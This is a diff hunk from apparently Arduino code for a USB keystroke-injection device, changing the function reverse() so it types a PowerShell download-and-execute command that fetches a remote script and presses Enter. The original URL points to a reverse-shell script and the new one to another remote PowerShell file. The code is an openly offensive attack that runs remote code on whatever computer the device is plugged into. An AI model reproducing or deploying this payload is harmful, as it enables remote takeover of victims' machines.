@@ -78,7 +78,7 @@ void opencmd(){
 }
 
 void reverse(){
-  esp_print("IEX (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/ricardojoserf/arduino-rubber-ducky-scripts/master/reverseshell/test.ps1\")");
+  esp_print("IEX (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/Jdelgado89/USB_Stuff/main/Recall.ps1\")");
   typeKey(KEY_RETURN);
   delay(100);
 }
